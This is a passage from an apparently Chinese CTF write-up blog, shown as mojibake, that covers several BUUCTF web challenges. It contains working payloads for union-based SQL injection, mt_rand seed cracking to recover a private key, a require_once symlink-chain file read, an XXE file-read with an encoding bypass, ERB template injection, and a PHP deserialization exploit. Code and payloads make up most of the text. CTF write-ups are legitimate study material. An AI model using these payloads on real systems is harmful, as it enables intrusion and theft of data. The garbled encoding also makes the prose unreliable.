åŸæ¥åœ¨alien_codeè¿™ä¸ªåº“é‡Œ\n\n```php\n/query?search=amazonis_planitia%20union%20select%20group_concat(SCHEMA_NAME)%20from%20information_schema.SCHEMATA\næ‰€æœ‰åº“ï¼šinformation_schema,alien_code,aliens\n/query?search=amazonis_planitia%20union%20select%201,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema='alien_code'\n\nè¡¨ï¼šcode\n/query?search=amazonis_planitia%20union%20select%201,group_concat(column_name)%20from%20information_schema.columns%20where%20table_name='code\n'\nåˆ—ï¼šid,code\n\n/query?search=amazonis_planitia%20union%20select%201,code%20from%20alien_code.code\nè¿™é‡Œè¦æŒ‡å®šä¸€ä¸‹åº“ ä¸ç„¶æ³¨ä¸å‡ºæ¥\n    \n```\n\n# 105ã€[MRCTF2020]Ezaudit\n\nä¹‹å‰å°±åœ¨buuä¸Šåšè¿‡è¿™ç±»ä¼¼çš„\n\né¦–å…ˆè¿›ç½‘é¡µæ˜¯ä¸€ä¸ªèŠ±é‡Œèƒ¡å“¨çš„ç•¥è¿‡ï¼Œç„¶åæ‰«åå°å‘ç°æºç æ³„éœ²`/www.zip`\n\n```php\n<?php \nheader('Content-type:text/html; charset=utf-8');\nerror_reporting(0);\nif(isset($_POST['login'])){\n    $username = $_POST['username'];\n    $password = $_POST['password'];\n    $Private_key = $_POST['Private_key'];\n    if (($username == '') || ($password == '') ||($Private_key == '')) {\n        // è‹¥ä¸ºç©º,è§†ä¸ºæœªå¡«å†™,æç¤ºé”™è¯¯,å¹¶3ç§’åè¿”å›ç™»å½•ç•Œé¢\n        header('refresh:2; url=login.html');\n        echo \"ç”¨æˆ·åã€å¯†ç ã€å¯†é’¥ä¸èƒ½ä¸ºç©ºå•¦,crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!\";\n        exit;\n}\n    else if($Private_key != '*************' )\n    {\n        header('refresh:2; url=login.html');\n        echo \"å‡å¯†é’¥ï¼Œå’‹ä¼šè®©ä½ ç™»å½•?crisprä¼šè®©ä½ åœ¨2ç§’åè·³è½¬åˆ°ç™»å½•ç•Œé¢çš„!\";\n        exit;\n    }\n\n    else{\n        if($Private_key === '************'){\n        $getuser = \"SELECT flag FROM user WHERE username= 'crispr' AND password = '$password'\".';'; \n        $link=mysql_connect(\"localhost\",\"root\",\"root\");\n        mysql_select_db(\"test\",$link);\n        $result = mysql_query($getuser);\n        while($row=mysql_fetch_assoc($result)){\n            echo \"<tr><td>\".$row[\"username\"].\"</td><td>\".$row[\"flag\"].\"</td><td>\";\n        }\n    }\n    }\n\n} \n// genarate public_key \nfunction public_key($length = 16) {\n    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $public_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);\n    return $public_key;\n  }\n\n  //genarate private_key\n  function private_key($length = 12) {\n    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $private_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\n    return $private_key;\n  }\n  $Public_key = public_key();\n  //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???\n```\n\nç¬¬ä¸€éƒ¨åˆ†æ˜¯ä¸€ä¸ªç™»å½• ç¬¬äºŒéƒ¨åˆ†æ˜¯å…¬ç§é’¥ æ˜¯ä¸ªå¯†ç é¢˜ï¼Ÿï¼Ÿï¼Ÿï¼Ÿ\n\nå®¡è®¡ç¬¬ä¸€éƒ¨åˆ†\n\n```php\n$username = $_POST['username'];\n    $password = $_POST['password'];\n    $Private_key = $_POST['Private_key'];\n```\n\næˆ‘ä»¬éœ€è¦çŸ¥é“ç”¨æˆ·åå¯†ç ç§é’¥ ç”¨æˆ·åæ˜¯crisprå·²ç»ç»™å‡º å¯†ç æˆ‘ä»¬å¯ä»¥ç”¨ä¸‡èƒ½é’¥åŒ™å»é—­åˆ å› æ­¤å…³é”®åœ¨äºç§é’¥\n\n` //$Public_key = KVQP0LdJKRaV3n9D  how to get crispr's private_key???`æœ€åä¸€å¥æç¤ºæˆ‘ä»¬è¦é€šè¿‡å…¬é’¥ç®—å‡ºç§å­ å†åˆ©ç”¨ç§å­ç”Ÿæˆç§é’¥\n\né¦–å…ˆè¦çˆ†ç ´ä¸€ä¸‹ç§å­\n\n```php\nstr1='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'\nstr2='KVQP0LdJKRaV3n9D'\nstr3 = str1[::-1]\nlength = len(str2)\nres=''\nfor i in range(len(str2)):  \n    for j in range(len(str1)):\n        if str2[i] == str1[j]:\n            res+=str(j)+' '+str(j)+' '+'0'+' '+str(len(str1)-1)+' '\n            break\nprint(res)\n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689045182635-356c24fb-2eef-4543-a0b8-69d47c40d71c.png)\n\nçˆ†ç ´å¾—ç§å­1775196155  å¹¶ä¸”ä¸‹é¢çš„ç§é’¥è¦ç”¨5.2.1åˆ°7.0.xçš„ç‰ˆæœ¬å»ç®— ä¸ç„¶ç®—å‡ºæ¥ä¸ä¸€æ · \n\næˆ‘ä¸€å¼€å§‹ç”¨php8ç®—çš„ä¸€ç›´ç®—çš„å’Œwpä¸ä¸€æ · ç‰ˆæœ¬è¦æ­£ç¡®æ‰è¡Œ\n\nå†æ¥ç®—ç§é’¥\n\n```php\n<?php\nmt_srand(1775196155);\nfunction public_key($length = 16) {\n    $strings1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $public_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $public_key .= substr($strings1, mt_rand(0, strlen($strings1) - 1), 1);\n    return $public_key;\n  }\n\n  //genarate private_key\nfunction private_key($length = 12) {\n    $strings2 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';\n    $private_key = '';\n    for ( $i = 0; $i < $length; $i++ )\n    $private_key .= substr($strings2, mt_rand(0, strlen($strings2) - 1), 1);\n    return $private_key;\n  }\n\n\n\necho \"public:\".public_key();\necho \"  private:\".private_key();\n\n?>\n```\n\nå¾—åˆ°\t` XuNhoueCDCGc  `\n\nè®¿é—®`/login.html` ç™»å½•å³å¯\n\n# 106ã€[æå®¢å¤§æŒ‘æˆ˜ 2020]Roamphp1-Welcome\n\nè¿™é¢˜å¤ªæŠ½è±¡äº†\n\né¦–å…ˆè¿›å»ä»€ä¹ˆä¹Ÿæ²¡æœ‰ï¼Œç„¶åæŠ“åŒ…æ˜¾ç¤º405çŠ¶æ€ç \n\n HTTPçŠ¶æ€ç  405 è¡¨ç¤ºè¯·æ±‚çš„æ–¹æ³•ä¸å…è®¸ã€‚å®ƒæ˜¯åœ¨å®¢æˆ·ç«¯å‘é€çš„è¯·æ±‚æ–¹æ³•ä¸æœåŠ¡å™¨ä¸Šæ‰€å…è®¸çš„æ–¹æ³•ä¸åŒ¹é…æ—¶ä½¿ç”¨çš„çŠ¶æ€ç ã€‚  \n\næ‰€ä»¥é»˜è®¤æ˜¯get æˆ‘ä»¬å°è¯•æŠ“åŒ…åæ”¹ä¸ºpostæ–¹å¼ çˆ†å‡ºäº†æºç \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689144943353-7aeef221-d563-4b1f-a3f6-ce3aeaa1786e.png)\n\nå¾ˆå¸¸è§çš„å¥—è·¯ æ•°ç»„ç»•è¿‡å°±è¡Œäº†\n\n```\nroam1[]=1&roam2[]=2\n```\n\nç„¶åå¯ä»¥çœ‹phpinfo\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689145004564-d20d1342-c322-450b-aa7f-c6e7959abc28.png)\n\nå‘ç°äº†`/f1444aagggg.php` é¢ã€‚ã€‚ä½†æ˜¯è®¿é—®å•¥ä¹Ÿæ²¡æœ‰ ç„¶åå°±å¯ä»¥åœ¨è¿™ä¸ªphpinfoæ‰¾åˆ°flagï¼Ÿï¼Ÿï¼Ÿ\n\nä¸æ‡‚ä¸ºå•¥è¿™é¢˜æ”¾åœ¨buuçš„ç¬¬å››é¡µ \n\n# 107ã€[WMCTF2020]Make PHP Great Again\n\nè¿™é“é¢˜ç›®ä¸»è¦è€ƒå¯Ÿäº†require_once\n\nä»–å’Œrequireå·®ä¸å¤š require_once ä¹Ÿä¼šåœ¨åŒ…å«æ–‡ä»¶æ—¶æ‰§è¡Œå…¶ä¸­çš„ä»£ç å¹¶å°†å…¶ç»“æœåŒ…å«åˆ°ä¸»è„šæœ¬ä¸­ã€‚åŒºåˆ«åœ¨äºï¼Œåœ¨åŒ…å«ç›¸åŒæ–‡ä»¶æ—¶ï¼Œrequire_once ä¼šæ£€æŸ¥è¯¥æ–‡ä»¶æ˜¯å¦å·²ç»è¢«åŒ…å«è¿‡ï¼Œå¦‚æœæ˜¯ï¼Œåˆ™ä¸å†é‡å¤åŒ…å«ï¼Œé¿å…å‡ºç°é‡å¤å®šä¹‰çš„é”™è¯¯ã€‚  \n\nphpçš„æ–‡ä»¶åŒ…å«æœºåˆ¶æ˜¯å°†å·²ç»åŒ…å«çš„æ–‡ä»¶ä¸æ–‡ä»¶çš„çœŸå®è·¯å¾„æ”¾è¿›å“ˆå¸Œè¡¨ä¸­ï¼Œå½“å·²ç»require_once('flag.php')ï¼Œå·²ç»åŒ…å«çš„æ–‡ä»¶ä¸å¯ä»¥å†require_onceã€‚  \n\n```php\n<?php\nhighlight_file(__FILE__);\nrequire_once 'flag.php';\nif(isset($_GET['file'])) {\n  require_once $_GET['file'];\n}\n```\n\næºç ä¸­å·²ç»åŒ…å«è¿‡äº†æ‰€ä»¥æˆ‘ä»¬å°±æ— æ³•å†åˆ©ç”¨è¿™ä¸ªå‡½æ•°å»åŒ…å«flagæ–‡ä»¶\n\nè¿™é‡Œæœ‰ä¸ªçŸ¥è¯†ç‚¹\n\n**require_once()åœ¨å¯¹è½¯é“¾æ¥çš„æ“ä½œä¸Šå­˜åœ¨ä¸€äº›ç¼ºé™·ï¼Œè½¯è¿æ¥å±‚æ•°è¾ƒå¤šä¼šä½¿hashåŒ¹é…ç›´æ¥å¤±æ•ˆé€ æˆé‡å¤åŒ…å«ï¼Œè¶…è¿‡20æ¬¡è½¯é“¾æ¥åå¯ä»¥ç»•è¿‡**ï¼Œå¤–åŠ ä¼ªåè®®ç¼–ç ä¸€ä¸‹ï¼š \n\nç„¶åå…³äº/proc/self/root \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689146550618-3a5f2ae6-340b-42f9-b327-afe4657204bb.png)\n\nç®€å•æ¥è¯´å°±æ˜¯æŒ‡å‘æ ¹ç›®å½•çš„è½¯é“¾æ¥ \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689146577763-dce5b8bf-979b-4f0e-8204-c5e26913b88d.png)\n\npayloadï¼š\n\n```php\n?file=php://filter/convert.base64-encode/resource=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n```\n\nè¿™ä¸ªæˆ‘è®°å¾—ä»€ä¹ˆæ—¶å€™åœ¨ctfshowè§è¿‡ åæ­£åˆå­¦åˆ°äº†\n\n# 108ã€[CSAWQual 2019]Web_Unagi\n\nè¿™é“é¢˜ç›®ç›®æ ‡è¿˜æ˜¯å¾ˆé²œæ˜çš„ è®©æˆ‘ä»¬ä¸Šä¼ æ–‡ä»¶ ç„¶åå†æŠŠæˆ‘ä»¬çš„å†…å®¹å±•ç¤ºå‡ºæ¥ å¹¶ä¸”æ˜¾ç¤ºä¿¡æ¯æ˜¯xmlæ ¼å¼çš„\n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä¸Šä¼ xmlæ–‡ä»¶è¿›è¡Œxxe\n\nä¸€å¼€å§‹æˆ‘ä¸Šä¼ çš„æ˜¯:\n\n```php\n<?xml version=\"1.0\"?>\n<!DOCTYPE username [\n<!ENTITY aaa SYSTEM \"file:///flag\"> ]>\n<users>\n\t<user>\n\t\t<username>&aaa;</username>\n\t\t<password>&aaa;</password>\n\t\t<name>&aaa;</name>\n\t\t<email>&aaa;</email>\n\t\t<group>&aaa;</group>\n\t\t<intro>&xxe;</intro>\n\t</user>\n</users>\n```\n\nä½†æ˜¯æ— è®ºæˆ‘å»æ‰flag systeméƒ½æ˜¯è¢«wafäº† çœ‹äº†wpæ‰æ˜ç™½å¯ä»¥ç”¨å…¶ä»–ç¼–ç ç»•è¿‡\n\nåœ¨kali `iconv -f utf8 -t utf16 1.xml>2.xml`\n\niconv æ˜¯ä¸€ä¸ªåœ¨ Linux å’Œ Unix ç³»ç»Ÿä¸Šå¸¸ç”¨çš„å­—ç¬¦ç¼–ç è½¬æ¢å·¥å…·ã€‚å®ƒå¯ä»¥å°†ä¸€ä¸ªå­—ç¬¦é›†çš„æ–‡æœ¬è½¬æ¢ä¸ºå¦ä¸€ä¸ªå­—ç¬¦é›†çš„æ–‡æœ¬ã€‚  \n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689149395750-95a55a53-b147-4d9c-86e3-e1c4b5782c95.png)\n\nè¿™é‡Œæœ‰ä¸ªå‘å°±æ˜¯åœ¨xmlæ–‡ä»¶ä¸­ä¸€å®šè¦åŒ…æ‹¬ä»–æœ¬æ¥å°±å­˜åœ¨çš„`<intro>&xxe;</intro>`è¿™ä¸ªæ ‡ç­¾ ä¸ç„¶å…¶ä»–æ ‡ç­¾å›æ˜¾flagä¸å®Œæ•´éƒ½æ˜¯ä¸€èˆ¬ åªæœ‰åœ¨è¿™ä¸ªå›æ˜¾çš„å®Œæ•´çš„\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689149481560-7cacba81-1c98-408b-b818-fcafa4800307.png)\n\n# 109ã€[SCTF2019]Flag Shop\n\nä¹°flag ä¸€çœ¼ä¸çœŸ\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689155122030-02f4658e-9dee-4cad-9574-9990289024e7.png)\n\nå°±æ˜¯ä¼ªé€ ç±»ä¼¼äºsessionä¹‹ç±»çš„å»ä¿®æ”¹è‡ªå·±çš„é’±æ•° ç„¶åå†å»ä¹°flag\n\nä½†æ˜¯éœ€è¦key æŠ“ä¸ªåŒ… å‘ç°æ„Ÿè§‰æ˜¯jwt\n\nç„¶åè®¿é—®/robots.txt çˆ†å‡ºæºç \n\n```ruby\nrequire 'sinatra'\nrequire 'sinatra/cookies'\nrequire 'sinatra/json'\nrequire 'jwt'\nrequire 'securerandom'\nrequire 'erb'\n\nset :public_folder, File.dirname(__FILE__) + '/static'\n\nFLAGPRICE = 1000000000000000000000000000\nENV[\"SECRET\"] = SecureRandom.hex(64)\n\nconfigure do\n  enable :logging\n  file = File.new(File.dirname(__FILE__) + '/../log/http.log',\"a+\")\n  file.sync = true\n  use Rack::CommonLogger, file\nend\n\nget \"/\" do\n  redirect '/shop', 302\nend\n\nget \"/filebak\" do\n  content_type :text\n  erb IO.binread __FILE__\nend\n\nget \"/api/auth\" do\n  payload = { uid: SecureRandom.uuid , jkl: 20}\n  auth = JWT.encode payload,ENV[\"SECRET\"] , 'HS256'\n  cookies[:auth] = auth\nend\n\nget \"/api/info\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  json({uid: auth[0][\"uid\"],jkl: auth[0][\"jkl\"]})\nend\n\nget \"/shop\" do\n  erb :shop\nend\n\nget \"/work\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  auth = auth[0]\n  unless params[:SECRET].nil?\n    if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\n      puts ENV[\"FLAG\"]\n    end\n  end\n\n  if params[:do] == \"#{params[:name][0,7]} is working\" then\n\n    auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    ERB::new(\"<script>alert('#{params[:name][0,7]} working successfully!')</script>\").result\n\n  end\nend\n\npost \"/shop\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n\n  if auth[0][\"jkl\"] < FLAGPRICE then\n\n    json({title: \"error\",message: \"no enough jkl\"})\n  else\n\n    auth << {flag: ENV[\"FLAG\"]}\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    json({title: \"success\",message: \"jkl is good thing\"})\n  end\nend\n\n\ndef islogin\n  if cookies[:auth].nil? then\n    redirect to('/shop')\n  end\nend\n```\n\nè¿™æ˜¯ç”¨rubyå†™çš„ è™½ç„¶ä¸æ‡‚è¯­è¨€ ä½†æ˜¯å¤§è‡´èƒ½æ˜ç™½å¹²äº†ä¸ªå•¥\n\nè¿˜çœŸæ˜¯ jwt  çœ‹äº†ä¸€ä¸‹keyçš„ç”Ÿæˆ `ENV[\"SECRET\"] = SecureRandom.hex(64)`è¿™è‚¯å®šæˆ‘ä»¬æ— æ³•ä¼ªé€  ç„¶åå°±æ²¡æ€è·¯äº†\n\nçœ‹äº†wp å‘ç°æ¶‰åŠERBæ¨¡æ¿æ³¨å…¥\n\nERBæ¨¡æ¿æ³¨å…¥æ ¼å¼æ˜¯`<%=å…¶ä»–%>`\n\nç›´æ¥æ¥çœ‹æ€æ ·è·å–flag\n\n```ruby\nget \"/work\" do\n  islogin\n  auth = JWT.decode cookies[:auth],ENV[\"SECRET\"] , true, { algorithm: 'HS256' }\n  auth = auth[0]\n  unless params[:SECRET].nil?\n    if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\n      puts ENV[\"FLAG\"]\n    end\n  end\n\n  if params[:do] == \"#{params[:name][0,7]} is working\" then\n\n    auth[\"jkl\"] = auth[\"jkl\"].to_i + SecureRandom.random_number(10)\n    auth = JWT.encode auth,ENV[\"SECRET\"] , 'HS256'\n    cookies[:auth] = auth\n    ERB::new(\"<script>alert('#{params[:name][0,7]} working successfully!')</script>\").result\n\n  end\nend\n```\n\n`params[:å˜é‡å]`è¿™é‡Œåº”è¯¥å°±æ˜¯getè¯·æ±‚å è™½ç„¶ä¸å¤ªæ‡‚ruby ä½†æ˜¯å¤§è‡´èƒ½çŒœå‡º\n\n`params[:name][0,7]`æˆ‘ä»¬è¾“å…¥çš„nameä¸èƒ½è¶…è¿‡7ä¸ªå­—ç¬¦\n\nå‰é¢è¯´åˆ°æˆ‘ä»¬åªèƒ½è¾“å…¥7ä¸ªå­—ç¬¦çš„name é™¤å»æ¨¡æ¿æ³¨å…¥çš„`<%=%>`å·²ç»å æ®äº†äº”ä¸ªå­—ç¬¦ æˆ‘ä»¬èƒ½æ§åˆ¶çš„åªæœ‰ä¸¤ä¸ªäº†\n\nè¿™é‡Œéœ€è¦ç”¨åˆ°Rubyè¯­è¨€çš„ä¸€ä¸ªç‰¹æ€§ æˆ‘ä»¬å¯ä»¥åˆ©ç”¨`$'`æ¥è¿”å›æ­£åˆ™åŒ¹é…ç»“æœçš„å³è¾¹  \n\n- `$'` æœ€åä¸€æ¬¡æ¨¡å¼åŒ¹é…ä¸­åŒ¹é…éƒ¨åˆ†ä¹‹åçš„å­—ç¬¦ä¸²  \n\næ¯”å¦‚`hello world `è®¾ç½®åŒ¹é…e é‚£ä¹ˆå°±ä¼šè¿”å›`llo world`\n\n```ruby\n    if ENV[\"SECRET\"].match(\"#{params[:SECRET].match(/[0-9a-z]+/)}\")\n      puts ENV[\"FLAG\"]\n```\n\nè¿™é‡Œå°±æ˜¯åœ¨ç”¨ç¯å¢ƒä¸­secretä¸æˆ‘ä»¬è¾“å…¥çš„secretè¿›è¡ŒåŒ¹é… å¦‚æœæˆ‘ä»¬è¾“å…¥secretä¸ºç©º\n\né‚£ä¹ˆ`$'`å°±ä¼šå¸®æˆ‘ä»¬å®Œæ•´çš„å€¼è¾“å‡º\n\næ‰€ä»¥payloadï¼š\n\n```\n/work?SECRET=&name=<%=$'%>&do=<%=$'%> is working\n```\n\né¿å…æ­§ä¹‰è¿›è¡Œurlç¼–ç åæ‰“å…¥\n\n```\n/work?SECRET=&name=%3C%25%3D$'%25%3E&do=%3C%25%3D$'%25%3E%20is%20working \n```\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156469993-1fe293bf-0731-4bb9-afa1-1baea4c66837.png)\n\nå¾—åˆ°äº†key ç„¶åjwtä¼ªé€  æ‰“å…¥æŠ“åŒ… å†è§£ç å°±å¯ä»¥å¾—åˆ°flagäº†\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156517393-2b00eb8d-8b8f-483c-bd18-6283d478d58c.png)\n\n\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689156526111-41289877-d5fe-43b4-995b-8a5c3c2fe4c0.png)\n\n# 110ã€[GYCTF2020]Easyphp\n\nä»£ç å®¡è®¡å…ˆæ”¾ç€ å¤ªæŠ½è±¡äº† å¤§æ¦‚çœ‹äº†ä¸€ä¸‹æ¶‰åŠååºåˆ—åŒ–å­—ç¬¦ä¸²é€ƒé€¸ sqlæ³¨å…¥ç­‰ç­‰ ä¹‹åå†æ¥å¡«å‘æŠŠã€‚\n\n# 111ã€[æå®¢å¤§æŒ‘æˆ˜ 2020]Greatphp\n\n```ruby\n<?php\nerror_reporting(0);\nclass SYCLOVER {\n    public $syc;\n    public $lover;\n\n    public function __wakeup(){\n        if( ($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover)) ){\n           if(!preg_match(\"/\\<\\?php|\\(|\\)|\\\"|\\'/\", $this->syc, $match)){\n               eval($this->syc);\n           } else {\n               die(\"Try Hard !!\");\n           }\n           \n        }\n    }\n}\n\nif (isset($_GET['great'])){\n    unserialize($_GET['great']);\n} else {\n    highlight_file(__FILE__);\n}\n\n?>\n```\n\nç»™äº†æºç  é‚£ä¹ˆæœ€é‡è¦çš„å°±æ˜¯è¿™ä¸ªç­‰å¼æˆç«‹\n\n```\n($this->syc != $this->lover) && (md5($this->syc) === md5($this->lover)) && (sha1($this->syc)=== sha1($this->lover))\n```\n\nä¸€èˆ¬æˆ‘ä»¬å¯ä»¥é€šè¿‡ä¼ æ•°ç»„ å°±å¯ä»¥bypass ä½†æ˜¯è¿™é“é¢˜ç›®æ˜¯åœ¨ç±»ä¸­ æ‰€ä»¥è¿™ä¸ªæ–¹æ³•å°±ä¸èƒ½ç”¨äº†\n\nå› æ­¤è¿™é‡Œç”¨åˆ°äº†æ–°çŸ¥è¯†ç‚¹ï¼š**md5()å’Œsha1()å¯ä»¥å¯¹ä¸€ä¸ªç±»è¿›è¡Œhashï¼Œå¹¶ä¸”ä¼šè§¦å‘è¿™ä¸ªç±»çš„ __toString æ–¹æ³•ï¼›ä¸”å½“eval()å‡½æ•°ä¼ å…¥ä¸€ä¸ªç±»å¯¹è±¡æ—¶ï¼Œä¹Ÿä¼šè§¦å‘è¿™ä¸ªç±»é‡Œçš„ __toString æ–¹æ³•ã€‚**  \n\næ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ç”¨å«æœ‰`__toString`æ–¹æ³•çš„å†…ç½®ç±»è¿›è¡Œç»•è¿‡ï¼Œè¿™é‡Œç”¨çš„æ˜¯Exception å’Œ Error ï¼ˆéšä¾¿é€‰ä¸€ä¸ªå“ªä¸ªéƒ½å¯ä»¥ï¼‰\n\nä»–ä»¬æœ‰ __toString æ–¹æ³•ï¼Œå½“ç±»è¢«å½“åšå­—ç¬¦ä¸²å¤„ç†æ—¶ï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚  \n\nä¸€ä¸ªç®€å•çš„demoæ¥ç†è§£ å·çš„\n\n```ruby\n<?php\n$a = new Error(\"payload\",1);$b = new Error(\"payload\",2);\n\necho $a;\n\necho \"\\r\\n\\r\\n\";\n\necho $b;\n?>\n```\n\nè¿™é‡Œæˆ‘ä»¬å°†ç±»å½“ä½œå­—ç¬¦ä¸²è¿›è¡Œè¾“å‡ºå°±ä¼šè°ƒç”¨æˆ‘ä»¬å†…ç½®ç±»ä¸­å•`__toString`é­”æœ¯æ–¹æ³•\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689246050444-e2bd3402-2a56-4bfb-a11a-4fc596dab0f3.png)\n\næ‰€ä»¥ `$a!=$b`ä½†æ˜¯æˆ‘ä»¬è¾“å‡ºçš„å†…å®¹ç¡®æ˜¯ç›¸åŒçš„\n\næ³¨æ„è¿™é‡Œæˆ‘ä»¬å°†`$a = new Error(\"payload\",1);$b = new Error(\"payload\",2);`æ”¾åœ¨åŒä¸€è¡Œäº† å› ä¸ºè¾“å‡ºçš„å†…å®¹åŒ…å«æˆ‘ä»¬çš„è¡Œæ•° æ‰€ä»¥ä¸ºäº†æ»¡è¶³æ¡ä»¶æˆç«‹ å°±è¦æ”¾åœ¨åŒä¸€è¡Œ\n\næ¥ç€çœ‹æ­£åˆ™å°†æˆ‘ä»¬å•åŒå¼•å·æ‹¬å·éƒ½wafäº† æˆ‘ä»¬å¯ä»¥include åŒ…å«flagæ–‡ä»¶ ç„¶åflagæ–‡ä»¶å¯ä»¥é€šè¿‡å–åçš„æ–¹å¼ç»•è¿‡\n\nexp:\n\n```ruby\n<?php\nerror_reporting(0);\nclass SYCLOVER {\n    public $syc;\n    public $lover;\n\n}\n$str = \"?><?=include~\".urldecode(\"%D0%99%93%9E%98\").\"?>\";\n$a = new SYCLOVER();\n$a->syc = new Error($str,1);$a->lover = new Error($str,2);#æ³¨æ„è¦åœ¨ä¸€è¡Œæ‰è¡Œ\necho urlencode(serialize($a));\n?>\n```\n\npayload:`?great=O%3A8%3A%22SYCLOVER%22%3A2%3A%7Bs%3A3%3A%22syc%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A1%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22E%3A%5Ccode%5Ctest%5C1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A10%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7Ds%3A5%3A%22lover%22%3BO%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A20%3A%22%3F%3E%3C%3F%3Dinclude%7E%D0%99%93%9E%98%3F%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A2%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22E%3A%5Ccode%5Ctest%5C1.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A10%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D%7D`\n\nè¯´æ˜ï¼š`?><?=include~\".urldecode(\"%D0%99%93%9E%98\").\"?>`ä¸ºä»€ä¹ˆè¦åœ¨å‰é¢åŠ `?>`\n\nException ç±»ä¸ Error çš„ __toString æ–¹æ³•åœ¨eval()å‡½æ•°ä¸­è¾“å‡ºçš„ç»“æœæ˜¯ä¸å¯èƒ½æ§çš„\n\nå› ä¸ºè¾“å‡ºçš„æŠ¥é”™ä¿¡æ¯ä¸­ï¼Œpayloadå‰é¢è¿˜æœ‰ä¸€æ®µæ‚ä¹±ä¿¡æ¯`Error: `\t\n\nå°±æ¯”å¦‚æˆ‘ä»¬ä¹‹å‰çš„é‚£ä¸ªdemo\n\n![img](https://z1d10t-blog.oss-cn-shenzhen.aliyuncs.com/img/blog1689247105099-87f2d3e4-1a74-4363-a461-6001c373d7c0.png)\n\nè¿›å…¥eval()å‡½æ•°å°±ä¼šä»¥è¿™æ ·çš„å½¢å¼ï¼š`eval(\"...Error: <?php payload ?>\")`\n\næ‰€ä»¥æˆ‘ä»¬è¦ç”¨sqlæ³¨å…¥çš„æ€æƒ³ `?>` æ¥é—­åˆä¸€ä¸‹\n\n`eval(\"...Error: ?><?php payload ?>\")`ï¼Œè¿™æ ·æˆ‘ä»¬çš„æ¶æ„ä»£ç å°±å¯ä»¥é¡ºåˆ©æ‰§è¡Œäº†ã€‚  \n\nå‚è€ƒï¼š[https://johnfrod.top/ctf/2020-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98greatphp/](https://johnfrod.top/ctf/2020-æå®¢å¤§æŒ‘æˆ˜greatphp/)\n\n# 